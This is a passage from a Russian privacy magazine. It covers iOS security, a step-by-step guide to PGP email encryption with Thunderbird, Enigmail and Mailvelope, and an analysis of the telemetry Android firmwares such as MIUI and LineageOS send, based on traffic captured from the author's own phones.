защита от зловредного программного обеспечения. В iOS с такой защитой
дело обстоит очень хорошо: Apple контролиру ет приложения, которые могут
быть установлены на iPhone. Обычные пользователи могут устанавливать
приложения исключительно из курируемо го  Apple магазина App  Store,
в который злов редное ПО может попасть в исклю чительных еди ничных слу‐
чаях и очень ненадол го. Уста новка из независимых источников возможна,
но доступна только разработчикам, корпоративным пользователям и отдель‐
ным хорошо разбирающимся в технике энтузиастам.
   Если зловредное приложение все же про никнет в систему, большого вре‐
да оно причинить не смо жет: в iOS каждое приложение надежно изолировано
как от самой системы, так и от других приложений с помощью песочницы,
а доступа, например, к сообщениям (SMS/iMessage) у сторонних приложений
нет принципиально.





 Широкую известность получил случай заражения ряда китайских при‐
  ложений, включая популярнейший в Китае WeChat, зловредным
 ПО XcodeGhost

Нужно отме тить, что в iOS реализован гранулярный контроль за разрешени‐
ями приложений. Можно по отдельнос ти разрешить или запретить каждому
приложению такие вещи, как воз можность работы в фоновом режиме, доступ
к местоположению, камере. Наличие этих нас троек поз воляет эффективно
ограничивать слежку со сто роны приложений, которые сде лали такую слежку
своим основным бизнесом (это каса ется и приложений клас са Facebook,
и игр наподобие Angry  Birds). В iOS 13 появится дополнительная воз‐
можность, позволяющая как ограничивать дос туп приложений к местополо‐
жению пользователя, так и увидеть, какие данные о местоположении при‐
ложение уже успело собрать.
  Наконец, Apple регулярно обновляет iOS даже на старых устройствах, опе‐
ративно исправляя найденные уязвимос ти. При этом обновления становятся
доступны одновременно всем пользователям.


ЗАЩИТА ОТ АТАК MITM (MAN IN THE MIDDLE)
iOS, начиная с 9‐й версии, защищена и от атак клас са man in the middle
с перехватом и подменой сертификата. И если в нашей лаборатории получи‐
лось исследовать протокол резервных копий iCloud в 8‐й версии iOS, то
в более новых ОС это сделать не уда лось по техническим причинам.


ВЫВОДЫ
Из‐за широкого распростра нения и ограниченной номенклатуры смартфоны
Apple и операционная система iOS находятся в фокусе внимания как спец‐
служб, так и независимых исследователей безопас ности. Это привело к появ‐
лению доступных для полиции ряда государств технических средств, позволя‐
ющих взломать код блокировки iPhone, а в ряде случаев — и получить дос туп
к данным даже без кода блокировки. Облачная синхронизация реализована
практически идеально. Тем не менее большая часть данных дос тупна как ком‐
пании Apple, так и полиции по официальному запросу.
  Ограниченное число категорий данных защищено дополнительным уров‐
нем шифрования и не выда ется по запросу, одна ко даже их можно извлечь,
если известны логин и пароль от Apple ID, есть доступ ко второму фактору
аутентификации и известен код блокировки одного из устройств пользовате‐
ля. Защита от слежки и зловредного ПО находится на максимально воз‐
можном для потребитель ских устройств уровне.
ПРИВАТНОСТЬ

 СПРАВОЧНИК
 АНОНИМА





         ТЕОРИЯ И ПРАКТИКА
       ШИФРОВАНИЯ ПОЧТЫ





Есть  такая  занятная  штука —  тайна
переписки. Прав да, широко известно о ней
лишь в очень  узких  кругах анонимусов.
По крайней мере, пра вительства и спец‐
службы о ней слыхом не слыхивали, да и              Nik Zerof                                                                                              xtahi0nix@gmail.com
некоторые  коммерсанты  очень  любят
сунуть свой любопытный нос в чужой поч‐
товый ящик: а вдруг удастся разнюхать
что‐то о предпочтениях абонента и прис‐
лать ему еще немного бесполезной рек‐
ламы?  Сегодня мы  погово рим  о  том,
как  защитить  свою  электронную  почту
от постороннего назойливого внимания.


Спра воч ник ано нима
Статьи из этого цик ла публику ются бес платно и доступны всем. Мы убеж‐
дены, что каждый имеет право на базовые знания о защите своих данных.
  Другие статьи цикла:
 • «Виды шифрования и защиты тра фика, выбор софта»;
 • «Делаем шпионскую флешку с защищенной операционкой Tails»;
 • «Как шифровать переписку в Jabber: пошаго вая инструкция».

Если для тебя эти материалы тривиальны — отлично! Но ты сделаешь доброе
дело, отправив ссылку на них своим друзь ям, зна комым и родственникам,
менее подкованным в техничес ких вопросах.



ЗАЩИТА ЭЛЕКТРОННОЙ ПОЧТЫ
Существует куча сайтов и сервисов, клят венно обещающих оберегать при‐
ватность своих пользователей от любых поползновений. Правда, зачастую —
только на словах. Например, сервис защищенной почты ProtonMail уже неод‐
нократно обвиняли в том, что он помога ет пра воохраните лям и сливает
информацию о своих пользователях в чужие руки (первый раз — в 2018 году,
второй — совсем недавно). Руководство почтовика всякий раз находи ло себе
оправдания, но дыма без огня, как говорится, не бывает. Значит, о приват‐
ности и аноним ности нужно побеспокоиться самому, не полагаясь на чужих
дяденек и тетенек. Что для это го нужно? А вот пря мо сейчас и разберемся.
   Как всегда, в этой замет ке будет необходимая часть теории, а после я
расскажу о некоторых приложениях и объясню, для чего они нужны и как ими
пользоваться. Если, конечно, ты не помрешь от тоски, изучая первую часть
опуса. Погнали?


(НЕ)СКУЧНАЯ ТЕОРИЯ
Даже маленький ребенок, только выйдя из пеленок, уже прекрасно осведом‐
лен о том, что винда с точки зрения надеж ности хранения персональных дан‐
ных напоминает решето. Поэто му, если у тебя нет возможности навсегда
избавиться от этого поделия прог раммистов из Редмонда (иначе на чем мы
будем запускать любимые игрушки?), систему нужно правильно настроить,
навсегда отбив ей охоту передавать что попало куда не надо. Грамотная нас‐
тройка Windows — тема отдельного раз говора, и к ней мы когда‐нибудь обя‐
зательно вернемся, а сейчас речь о другом.
  После того как мы установим безопас ную ОС, которая не рассказывает
своим создателям о каждом нашем шаге, нужно задуматься о свя зи с внеш‐
ним миром. Самый древний и рас пространенный способ такой свя зи после
голубиной почты — поч та электронная. Обойтись без нее непросто: было бы,
конечно, неплохо, если бы всевозможные роботы отсы лали нам подтвержде‐
ния о  регистрации  куда‐нибудь  в  запрещенный  телеграмчик, но они
почему‐то предпочитают делать это «мылом», будто в каменном веке.
  Нужно понимать, что если сервер электронной почты не принадлежит тебе
лично, не стоит на твоих антресолях рядом с бабушкиными калошами
и коробкой дедушкиных таблеток от метеоризма и на нем ко всему прочему
не крутится ПО с открытыми исходниками, то нет никакой гарантии, что твою
переписку не читает товарищ майор или не фильтру ет по ключевым словам
специально обученный робот. При том что заявления компании — владельца
сервака о ее честности, белизне и пушистости ты при всем желании никак
не сможешь проверить.
  Даже если поч товый сервис шифрует твои данные на лету прямо в браузе‐
ре, алгоритм шифрования все равно загружается с сервера. Как ты про‐
веришь корректность этого самого алгоритма вся кий раз, когда отправляешь
письмо? Вывод: кому бы почтовый сервис ни принадлежал, безус ловно
доверять ему свои письма мы не можем. Из это го следует, что обя занность
шифровать письма лежит на нас самих.


             INFO

                       Требование к любому приложению, которое опе‐
                      рирует  твоими  данными или  отвечает  за  их
                        защиту, всегда одно: исходный код этого при‐
                      ложения должен быть  открыт. Это  тот необ‐
                     ходимый минимум, который может обеспечить
                      защиту от закладок и недокументированных воз‐
                     можностей. Все приложе ния и плагины, пред‐
                         ставленные   в   статье,  обладают  открытым
                     исходным кодом.


Можно отправлять‐получать почту через веб‐интерфейс, но в этом случае ты
лишаешься удовольствия использовать проверенные сторонние плагины
с открытым исходным кодом, предназначенные для обеспечения при ват‐
ности. Поэтому наш выбор — почтовый клиент.
  Я рекомендую установить, например, Thunderbird. Во‐первых, это наз‐
вание ни один товарищ майор не выгово рит без ошибок с первого раза,
а во‐вторых, софтина поддерживается сооб щес твом и позволя ет устанав‐
ливать расширения. Для шифрования переписки можно воспользоваться
плагином Enigmail, который активно раз рабатывает ся по сей день и регуляр‐
но обновляется.
  Кроме того, нам понадобятся специальные приложения, которые реали‐
зуют шифрование, — это GnuPG для *nix или Pgp4Win для Windows. Пос ле
этого будет необ ходимо соз дать пару закрытый — откры тый ключ и не
забывать подписывать свои письма элек тронной подписью, чтобы получатель
точно знал, что письмо пришло именно от тебя. Звучит сложно? На самом
деле все гораздо проще, чем кажет ся.


             INFO

                    Даже с учетом шифрования почтовый сервер все
                       равно будет знать, откуда ты к нему подключился,
                     сможет определить время подключения, действия
                        с  письмами  (удаление,  создание, пересылка)
                      и адрес, на который было отправлено письмо.
                    Но прочитать информацию из письма сможет
                        только  получатель. И  не  забывай:  заголовок
                        с темой письма по умолчанию не зашифрован,
                          так  что выбирай  тему  осмотрительно,  чтобы
                      ненароком не спалиться.



УСТАНОВКА И НАСТРОЙКА НЕОБХОДИМОГО ИНСТРУМЕНТАРИЯ
С установкой почтового клиента Thunderbird у тебя точно не дол жно воз‐
никнуть проблем — по слухам, однажды с этой архисложной задачей спра‐
вилась даже шимпанзе из рязанского зоопарка. Далее поставим Pgp4Win,
только убедись, что на экра не «Компоненты устанавливаемой программы»
есть все нужные галочки!





                 Сна чала устанавлива ем Pgp4Win





        Не забудь выбрать все компоненты во время установки

После этого запускаем Thunderbird и нас тра иваем в клиенте дос туп к своему
почтовому ящику (документации по настройке  Thunderbird в интернете
навалом). Следующим этапом устанавлива ем плагин Enigmail.





                       Ус танавливаем Enigmail

Закончив эти танцевальные номера с буб ном, создаем ключевую пару
(открытый и закрытый ключ) и сертификат отзы ва клю ча. Этот сертификат пот‐
ребуется, если ты однажды потеряешь по пьяни по какой‐то причине сек‐
ретный ключ и тебе потребуется отозвать заг руженный на сервер открытый
ключ.
   Итак, чтобы создать ключевую пару, перей дем в меню «Enigmail → Менед‐
жер клю чей». После это го нужно выб рать пункт «Новая пара ключей» в меню
«Создать». В открывшемся окне отоб разят ся настройки создаваемой клю‐
чевой пары, поле для вво да парольной фра зы и выбор алгоритмов шиф‐
рования во вкладке «Дополнитель но». Прог рамма предлагает выбрать один
из двух криптографических алгорит мов — ECC и RSA.





               Настрой ка соз дава емой ключевой пары


Вы бор меж ду ECC и RSA
Давай разберемся, чем эти алго ритмы отличаются друг от друга и какой
из них лучше выбрать.
  RSA (аббревиатура от фамилий соз дателей — Rivest, Shamir и Adleman) —
асимметричный криптогра фический алгоритм, основанный на сложности
задачи факторизации (разложения) больших целых чисел. Это была заумная
цитата из Википедии. А если попроще, то дос таточно сказать, что этот алго‐
ритм старый, как Pentium 4, но такой же надежный и проверенный временем.
Он используется повсемес тно в самых раз ных при ложениях и защищенных
протоколах.
  Существует его более новый и, как считается, прогрессивный аналог —
алгоритм ECC (Elliptic Curve Cryptography). Та же Википедия говорит нам, что
этот  асимметрич ный  алго ритм  «опирается  на  эллиптичес кие  кри вые
над конечными полями». Что это означает, при желании прочтешь там же.
А нам важно вот что: для обеспечения одинаковой степени криптостойкости
алгоритму RSA требуются ключи длиной 4096 бит, а алгоритму ECC — все го
от 256 до 384 бит. А если взять ECC с длиной клю ча 521 бит, то по крип‐
тостойкости он будет эквивалентен RSA с длиной клю ча 15 360 бит!
  Из этого сле дует, что шифрование с применением ECC будет быстрее
и менее энергозатратно, что не может не радовать, если ты используешь
мобильные устройства. С дру гой стороны, с RSA мы пользуемся проверен‐
ным временем (и мас сой матема тиков) криптографичес ким алгоритмом,
который име ет к тому же некоторый «запас прочности» перед нас туплением
эпохи квантовых компьютеров.


   —Пароль    это важ но!
Несмотря на стойкость криптоалгоритмов, необ ходимо уделить внимание
выбору качественного пароля для шифрования. Если пароль будет недос‐
таточно стойким, то расшифровать твою переписку не сос тавит большого
труда, какие бы крутые криптоалгоритмы ты ни использовал.
  Не забывай: пароль не должен быть коротким — нужно использовать
не менее 12–15 символов. Пароль не должен быть любым словарным сло‐
вом, должен иметь цифры и буквы обо их регистров, вступление, заключение,
развитие драматического сюжета и список использованной литературы
в конце.
  В основном работает пра вило: чем легче запомнить пароль тебе самому,
тем проще его будет подобрать злоумышленнику. Поэтому можно прос то
пару раз хорошенько стукнуться лбом о клавиату ру, а потом выучить получив‐
шуюся псевдослучайную последовательность символов. Главное — никогда
не придумывать и не менять пароли после шумной вечеринки. Однажды
нарушив это правило, ты поймешь почему.


После успешного создания ключевой пары программа предложит тебе соз‐
дать сертификат отзыва. Я рекомендую сделать это на всякий случай.





                   Создаем сертификат отзыва

Теперь все готово. Если кто‐то захочет зашифровать перепис ку с тобой, ему
понадобится открытый ключ. Передать его собеседнику можно любым спо‐
собом — ведь если открытый ключ перехватят, то все равно не будет никакой
возможности расшифро вать переписку. Но все‐таки я рекомендую загрузить
открытый ключ на специальный сервер — сервер ключей. Оттуда любой
человек может забрать твой открытый ключ, например выполнив поиск
по почтовому адресу. Чтобы загрузить ключ на сервер, в оснастке «Управле‐
ние клю чами» в меню прог раммы нуж но выб рать пункт «Разместить откры тые
клю чи на сервере клю чей».





             Размещаем открытый ключ на сервере ключей




                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

       СПРАВОЧНИК
          АНОНИМА
          ТЕОРИЯ И ПРАКТИКА ШИФРОВАНИЯ ПОЧТЫ




После этого ключ автоматически загрузится на сервер.





                       Заг рузка клю ча на сервер

Теперь давай посмотрим на практике, что представляет собой шиф рование
почты асимметричной криптогра фией. Мы соз дадим и отправим сами себе
зашифрованное сооб щение и посмотрим, как оно выглядит с плагином Enig‐
mail и без него — как если бы мы перехватили чье‐то сообщение. У нас уже
все настроено, нам просто нужно соз дать пись мо обычным способом,
не забыв нажать на кнопки «Зашифровать» и «Подписать».





              Создаем первое зашифрованное письмо

Полученное сообщение будет выглядеть как на картинке ниже.





                      Получили письмо!

Здесь видно, что сооб щение расшифровано и его подпись проверена, о чем
нам и сообщает Enigmail.
  А что, если мы не знаем секретного ключа и просто перехватили это сооб‐
щение, например на почтовом сервере? Как оно будет выглядеть в этом слу‐
чае, ты можешь посмотреть на следующей картинке.





                 Так выглядит шифротекст нашего письма

Как видишь, у того, кто перехватит нашу почту, будут большие проблемы с ее
чтением.


ПЛАГИН MAILVELOPE
Что, если по какой‐то причине ты не захочешь ставить почтовый клиент,
но все же решишь защитить свою переписку? Есть выход: расширение
для браузера под названием Mailvelope. Оно имеет откры тый исходный код,
поддерживается всеми современными браузерами и не требует для работы
никаких сторонних приложений. Но если ты установишь на компьютер Pg‐
p4Win, то у тебя появится воз можность выбора, какой дви жок использовать —
GnuPG или OpenPGP.js. В пос леднем реализовано шифрование PGP на язы ке
JavaScript.
   Чтобы начать поль зовать ся шифрованием почты при помощи Mailvelope,
нужно будет еще сгенерировать клю чевую пару и отправить открытый ключ
на сервер клю чей — в нас тройках Mailvelope это можно сде лать установкой
нужной галочки.





                   Уп равление клю чами в Mailvelope

Сгенерированная клю чевая пара появится во вкладке «Управление ключами».





                    Созданная ключевая пара

Кроме того, есть возможность импорта и экспорта готовых ключевых пар.
Еще расширение умеет шифровать передаваемые вложения и отдельные
файлы, в нем есть возможность добавлять электронную подпись. Теперь,
если ты зайдешь в свой почтовый ящик через веб‐интерфейс и попытаешься
написать кому‐то письмо, в форме ввода пись ма появится новая кнопка,
запускающая Mailvelope.





             Создаем сооб щение через веб‐интерфейс

Если кликнуть по этой кнопке, откроется окно ввода сообщения. Когда пись‐
мо будет написано, необ ходимо нажать на кнопку «Зашифровать».





                     Ин терфейс Mailvelope

Зашифрованное   сооб щение    будет    автоматически    скопировано
в веб‐интерфейс почтового сервера.





          Вставили шифротекст в интерфейс почтового сервера

Если расширение активно, сооб щение дешифруется и электронная подпись
проверяется автоматически, нужно будет только ввес ти свой пароль.





               Приняли зашифрованное сооб щение


                      AndroidШиф рование поч ты на
Если у тебя смартфон с Android, обрати внимание на приложение OpenKey‐
chain, которое поможет в шифровании сообщений в твоем телефоне.
В качестве почтового клиента для Android можно использовать K‐9 Mail —
это известный поч товый клиент с откры тым исходным кодом, а принцип
генерации ключевых пар там точно такой же, как и на десктопе.



ЗАКЛЮЧЕНИЕ
Теперь ты знаешь, как обес печить передачу конфиденциальной информации
через недоверенную сеть — интернет, где каждый, начиная провайдером
и заканчивая администратором почтового сервера, может перехватить и про‐
читать твои элек тронные сообщения и выведать все тайны.
  При помощи асимметричной криптогра фии можно безопасно передавать,
например, ключи для рас шифровки криптоконтей неров, которые ты оставил
на каком‐нибудь файлооб меннике, да и любые другие непубличные данные.
ПРИВАТНОСТЬ

 ТИШЕ ВОДЫ,
 НИЖЕ ТРАВЫ





    ЧТО И КАК СЛИВАЮТ ГУГЛОФОНЫ





Ни для кого не секрет, что наши с тобой
телефоны знают о нас слиш ком много.
Порой даже больше, чем мы сами. И пока
твой гаджет с тобой, трудно найти хоть
минутку, когда никакая информа ция о тво их              Hackcat                                                                                         hackcat.dev@gmail.com
действиях не попадет в сеть. Допустим, ты
установил кас томную прошивку и не уста‐
навливал GApps. Думаешь, твои дан ные
в безопасности? Сейчас проверим!


Производители смартфонов хотят сделать свои гаджеты уникальными. Одни
достигают этого за счет реализации запредельных конфигураций (привет,
Nokia 9 с пятью камерами), а дру гие, не имеющие таких ресурсов, украшают
ничем не примечатель ное железо фир менными прошивками. Иногда вся
«уникальность» прошивки заключается в фир менном лаунчере и обоях, в дру‐
гих имеет место пол ная переработка Android.
  Первый способ исполь зовал ZTE, выпустив в свет недорогой Blade
L4 с прошивкой от «Билайна» в качестве единственного варианта. Помимо
кучи бесполезного соф та от собственно «Билайна», в «подарок» шли GApps
в пол ном наборе (само собой, без воз можнос ти удаления) и антивирус,
который отказывался работать без симки «Билайна». Второй способ исполь‐
зует китайская компания Xiaomi, известная своей бюджетной линейкой Redmi
и довольно интересной прошивкой MIUI, в которой от оригинального «Андро‐
ида» почти ничего не оста лось. То же самое делает Meizu, выпускающая свои
телефоны с прошив кой Flyme.
  И если с телефонами самой Google все более‐менее ясно — информа‐
цию о том, какие данные они собирают, компания пуб ликует откры то и даже
позволяет забрать дамп этих данных себе, — то что собирают о нас китай‐
ские смартфоны? А какую информа цию о тебе сливает AOSP или тот же Lin‐
eageOS, если из них выпилить (или просто не устанавливать) сервисы и при‐
ложения Google? Попробуем разобраться.


ПОДОПЫТНЫЕ ПРОШИВКИ
Для начала определимся с кандидатами на тестирование. У нас их будет
четыре:
 • Pixel Experience — сборка AOSP с полным комплектом приложений
   и сервисов Google. Это кастом, но кас том, максимально приближенный
   к прошив ке, которую Google устанавлива ет на свои «Пиксели». Для нас
   это будет своего рода образец, который показывает, что сливает в сеть
   сама Google;
 • LineageOS 16 — кастомная прошивка на базе AOSP без приложений
   и сервисов Google. На этой прошивке мы про верим утверждение, что,
   если ты хочешь, чтобы за тобой не следили, надо поставить кастом
   без GApps;
 • MIUI 10.2.3.0 Global Stable — про шивка от Xiaomi. По сути, это уже
   не совсем Android, а взрывная смесь из китайских сервисов, собственной
   системы контроля разрешений, Google Play и его компании и тонны
   не удаляемого штатными средс тва ми софта, который, впрочем, по умол‐
   чанию почти никакой угрозы не несет;
 • Flyme 6.8.4.3R beta — про шивка Flyme от Meizu. К сожалению, офи‐
   циальная версия так и не вышла из состояния беты, но в неофициальной
   (пусть и более новой) сборке были выпилены все сервисы от Meizu, стало
   быть, и тестировать нам будет нечего. Так что при дется довольствоваться
   этой версией.


КТО И ЧТО ЗНАЕТ О НАС
В главных ролях:
 • корпорация добра по имени Google;
 • Xiaomi / Meizu / другой вендор.

Из заявления об отсутс твии конфиденциальнос ти мы знаем, что Большой
Брат Google собирает и хра нит мас су информа ции. Это:
 • твоя история поиска, и не только в фир менном поис ковике, но и в YouTube,
   который, как ты зна ешь, тоже принадлежит Google. По умолчанию сбор
   этой информации включен и никак не афишируется, но ты можешь отклю‐
   чить ее сбор на странице нас троек акка унта;
 • полная история тво его местополо жения, добываемая со смартфона.
  За это отвечает неубиваемая служба GoogleLocationService, работающая
  даже в том случае, если GApps’ы установлены в варианте pico. Особен‐
   ность ее состоит в том, что для определения мес тоположения использует‐
   ся не только GPS, но и сотовые вышки и сети Wi‐Fi. Вся эта информация
   хранится локально, но при наличии подключения к интернету сливается
   на серверы Google;
 • информация о приложениях на твоем устрой стве и об их версиях. Эти дан‐
  ные сливают ся Play Market’ом и нужны, надеюсь, только для статистики.
  На основании этой статис тики заполняется раз дел «Вам может понравить‐
   ся» в Play Market’е;
 • все твои кон такты. За их сбор отвечает служба синхронизации, включен‐
   ная по умолчанию;
 • записи всех голосовых запросов;





 • полная и развернутая статистика твоих действий с телефоном и поис ком.
  Найти ее можно тут.





Как видно из скрин шота, Google собирает даже конкретное время запуска
приложения на конкретном устройстве. Как ты уже догадался, эта функция
тоже включена по умол чанию.





              Ладно еще Linux, но Windows‐то тут откуда?

Кроме того, для тебя соз дается специальный рекламный профиль. Пос‐
мотреть и изме нить его можно по этой ссылке.
  Впрочем, рассказывать, что именно собирает о нас с тобой Большой
Брат, можно очень дол го. Думаю, что и этого, весь ма скудного набора будет
достаточно, чтобы ты понял, чем пахнет такое положение вещей.
  Перечень информации, которую собирает Xiaomi, также весьма обширен
(оригинальная орфогра фия сохранена):



     • Информация, которую вы предос тавляете нам или отпра‐
        вить (вклю чая контак тные данные): мы можем собрать любую пер-
         сональную информа цию, которую вы пре дос тавляете нам, нап-
        ример, ваше имя, номер мобильного телефона, адрес элек тронной
         поч ты,  адрес  дос тавки, Ми  рек визитов  (нап ример,  связанные
         с безопас ностью информа ции, ФИО, дата рождения, пол), заказа,
         сче та‑фак туры, материалы или информа цию, Вы можете синхро-
        низировать через облачные Ми или дру гими приложе ниями (нап-
        ример, фотографии, спис ки контактов), информа ция в отношении
         соз дания  учетной записи и  учас тия  в форуме  MIUI на  xiaomi
        или дру гой платформы, номера телефонов, которые вы вводите
         в «контакты» или отпра вить сообщение, обратную связь, и любую
        дру гую информа цию, которую вы нам пре дос тавляете.
     • Устройства или SIM‐обзоры информация: информа ция, свя-
         занная с вашим устройством. Нап ример, номер IMEI, imsi номер,
        MAC-адрес, на MIUI, вер сия андроид, номер детали и наз вание
        модели, опе ратора сети.
     • Сведения о вас, которые могут быть назначены нами: мы
       можем собирать и использовать информа цию, такую как Ми ID
         учетной записи.
     • Информацию о местоположении (только за конкретные услу ги/
        функции): раз личную информа цию о вашем мес тоположении. Нап-
        ример, код стра ны, код города, код мобильной сети, мобильные
         лич ности, долготы и широты, язы ковые нас тройки.
     • Журнал сведений: информа цию, относящу юся к использованию
         некоторых функций, приложе ний и веб‑сайтов. Нап ример, cookie-
       файлы и дру гие аноним ные технологий идентифика тор, IP адре са,
        вре менную историю Сообщений, стандар тные сис темные жур налы.
     • Другая информация:  эко логичес кие  харак терис тики  зна чение
        (ОКП) (т. е. зна чение, генерируемое Ми номер сче та, телефона, ID
         устройства, под клю чен Wi-Fi Интернет ID и мес тоположение зна-
          чения).

    Мы так же можем собирать дру гие виды информа ции, которые не свя-
      заны с физичес ким лицом и которое является аноним ным. Нап ример,
     модели устройства и вер сии сис темы количес тво пользовате лей Xiao-
      mi  в  устройстве  мобильного  телефона  могут  быть  получе ны
      при использовании опре деленной услу ги. Подобные све дения собира-
      ются для того, чтобы улуч шить услу ги, которые мы пре дос тавляем
      Вам. Тип и объем собранной информа ции будет зависеть от того,
       как вы используете, соглашение или учас твовать в наших продук тах и/
      или услу гах.

Это цитата из официальной политики конфиденциальности (для тех, кто
не понял, я спе циально сделал перевод на человеческий русский), которая,
по сути, гарантирует нам полное ее отсутствие. В свете этого старая совет‐
ская фраза «Нам нужен мир, и по воз можнос ти — весь» обретает чуть другую
формулировку: «Нам нуж ны твои данные, и по возможности — все». Зву чит
печально? Что ж, готовься к худшему.


ТЕСТОВЫЙ СТЕНД
Тестовый стенд будет не один, а сра зу три:
 • ZTE Blade L4 2015 года выпуска;
 • Xiaomi Redmi Note 4X 2017 года выпуска;
 • Xiaomi Redmi 4X.

С инструментами тоже все прос то: Fiddler, Wireshark и tcpdump. Fiddler с Wire‐
shark’ом мы поставим на большую машину, а tcpdump — на телефон со све‐
жеустановленной прошивкой. Алгоритм дей ствий будет сле дующим:
 1. Устанавливаем чистую прошивку (по воз можнос ти без GApps).
 2. Без активации гуглоаккаунта уста навливаем tcpdump и (по возможности
   и необходимости) корневой сертификат Fiddler’а.
 3. Подклю чаемся к Wi‐Fi‐сети, которая раз дается с ноута (там сидят Wire‐
   shark и Fiddler).
 4. Сидим в засаде пол часа.
 5. Тыкаем менюшки, вся чес ки симулируя действия пользовате ля, но ничего
   не меняем.
 6. Отключаем все, что можем отключить без прав root, и еще раз проходим
   пункты 4–5.


        WWW

                      Если ты обладатель i‐девайса, обрати внимание
                       на недавнюю статью о безопасности ябло кофо‐
                         нов.



СНИФАЕМ ТРАФИК С ЖИВОЙ СИСТЕМЫ
Я поднял точку доступа с ноутбука с Ubuntu 18.04 на борту, настроил на ней
шлюз и повесил Wireshark. Конечно же, толку от него мало, если трафик идет
по HTTPS, но в боль шинстве случаев сам факт установления соединения
на некоторый адрес уже достаточное доказа тельство. Дальнейшая настрой ка
проста как два рубля: нас траиваем hostapd на хостовой машине, вешаем
Wireshark там же, на телефоне импортируем корневой сертификат Fiddler’а
и настраиваем прок си. Всё!


LineageOS 16
LineageOS — прошив ка, основанная на коде CyanogenMod, который в свое
время был эталоном среди свободных про шивок. «Циан» породил множество
форков, из которых LineageOS, наверное, самый известный.
  Сразу после загрузки нам предлага ют сог ласиться на отправку анонимной
статистики. Однако даже после согласия прошивка молчит. Не появилась она
и после получаса сидения в засаде. На подклю чение к Wi‐Fi‐сети прошивка
среагировала лишь проверкой соединения и затихла.
  Вывод: LineageOS если и переда ет что‐то, то дела ет это не сразу.


MIUI
С самого начала прошивка вела себя нес покойно. Запросы лились рекой
на следующие сер веры:
 • connect.rom.miui.com;
 • android.clients.google.com;
 • www.gstatic.com;
 • mtalk.google.com;
 • data.mistat.intl.xiaomi.com;
 • storage.googleapis.com;
 • redirector.gvt1.com;
 • www.youtube.com;
 • dl.google.com;
 • api.sec.miui.com;
 • r8‐‐‐sn‐cxauxaxjvh‐hn9e7.gvt1.com.

Первый HTTP‐запрос был на connect.rom.miui.com/generate_204, нужный
для проверки соединения. Замечу, что зап росы туда идут почти каждые пол‐
торы‐две минуты, несмотря на отсутс твие обрывов и стабильно низ кие пинги.
   Как только соединение было про верено, телефон свя зал ся с адресом
data.mistat.intl.xiaomi.com/mistats/v2 и передал ему поч ти 2 Кбайт
данных. Судя по всему, это что‐то вроде телемет рии.





                 Капля из океана собира емых данных

Затем еще два увесистых пакета с данными улетели на другой хост этой под‐
сети (161.117.71.187), но, к сожалению, они оказались закодированы. Оба эти
адреса находятся в Сингапуре.
  Следующий интересный зап рос ушел на relocationapi.micloud.xiao‐
mi.net/mic/relocation/v3/user/record. Он содержал  наз вание моей
страны и подпись, назнача емую, как я увидел в даль нейшем, каждому пакету
для защиты от подделки. Следующим зап росом туда же улетел некий статус,
а затем еще несколь ко пакетов данных.
  Следующая дверь, куда телефон постучал, была по адресу api.device.
xiaomi.net. Сам запрос оказался пустым, но содержал кукисы, в которых
лежала вся информация о моем телефоне, в том числе и уникальный серий‐
ный номер. В ответ на него телефон получил некий serviceToken, который
отныне светится во всех HTTP‐запросах, и не только на этот адрес. Следом
туда же ушел мой User ID и Device ID.
   Дальше мы видим то, что я ожидал увидеть в самом начале: обращение
к рекламной сети. И не какой‐то, а сво ей. Адрес хос та — globalapi.ad.xi‐
aomi.com. На сервер ухо дит версия рекламного SDK и наш User ID из прош‐
лого запроса. В ответ мы получа ем список ключевых слов, согласно которым
отныне будет загружать ся реклама, и время хра нения этой информации
в кеше (указан как TTL).
   Из‐за популярности устройств линеек Mi и осо бенно Redmi в Xiaomi сте‐
кается уйма информации. Для балансировки нагрузки компания раз вернула
приличную по размерам сеть по всему миру. Мой телефон прикрепили
к индийскому серверу, и отныне вся информа ция идет туда.





            Download Provider должен Download, а не Upload!

Часть информации ушла через Download Provider (com.android.providers.
downloads), которому ни один здра вомыслящий человек доступ в сеть
не запретит. Кстати, те же фокусы (то есть такие же пакеты, только с другими
значениями channel и package_name) про ворачивает менеджер тем (com.
android.thememanager) и календарь (com.android.calendar). В среднем
такие запросы идут каждые 30–40 секунд на раз ные адре са и с разными зна‐
чениями channel и package_name.
  Но настоящее шпионство только начина ется: в один прекрасный момент
мы получаем от resolver.gslb.mi‐idc.com не только наш внешний IP‐адрес
(хотя непонятно, зачем он нужен телефону), но и стра ну, город, название про‐
вайдера, наш реальный IP‐адрес (если мы сидим за проз рачным прокси),
домен, куда нужно сливать статистику (мне при шел s.mi1.cc), используемый
TTL, некий tid и по два ава рийных адреса для использования через Wi‐Fi
и мобильную сеть соот ветственно (обращений к ним я не зафиксировал, но,
если основные серверы Xiaomi навернутся, возможно, что‐то и найдется).
  Я уже хотел было заканчивать обзор этой прошивки, но заметил во втором
дампе  запрос  к  gstatic.com/android/config_update/11052018‐sms‐
metadata.txt, в ответ на который нам пришел текстовый файл со сле‐
дующим содержимым:


SIGNATURE:uE3dCcZfnDvXnxsV+uHVOmnzZS03kIcda4t2tA4tKY0w6vvx5vngBO6GTb/
8j5+3ZvjqBBkx5f8rsiopC/7QgBQhDBBQMJj9i0oWycA/PzRiPGGpXySdyNobw5GKb8KB
2GjFW5VXgC1GMuRkWHeCfGGV9zlXbueQeIschm+gayIA18g9D7Gs9cVzbzWo7VS
L3ppbiJHD9FIf7VWeJjh8MhdYruWnHducGiztDKtXPNnWjgNKIlWYu5w3TiK3At
FinLUNE2ht15Z+nvRwcGVEmzeY8JKjDK3nRyhYrSWY3uDe5J9hUF9ViXSIWkDS5QP
9aEx8wLv0+6EFSibpyZUK9Q==
VERSION:19
REQUIRED_HASH:NONE

Это метаданные к коротким кодам SMS.
   Это было все, что я накопал из незашифрованного трафика, но осталось
еще много SSL‐ и TLS‐трафика, с которым разобрать ся не получилось. Про‐
шивка волшебным обра зом игнорировала выставленные настрой ки прокси,
так что пришлось ограничиться исследованием того, что можно было достать
«голыми руками».
   Что до отключения этой грандиозной шпионской машины, то в ней встро‐
ено слишком мно го инстру ментов для сбора данных. Отключить все это штат‐
ными средствами не удастся, а удаление «приложений‐стукачей» целиком
превратит твой телефон в обычную звонилку, тол ку от которой никакого.


Pixel Experience

        Pixel Experience is an AOSP/CAF based ROM, with Google apps included
      and all Pixel goodies.

Эта цитата вполне точно передает сущность прошивки. По сути, Pixel Experi‐
ence — не что иное, как AOSP с лаунчером из смартфона Pixel плюс все при‐
ложения из пакета GApps.
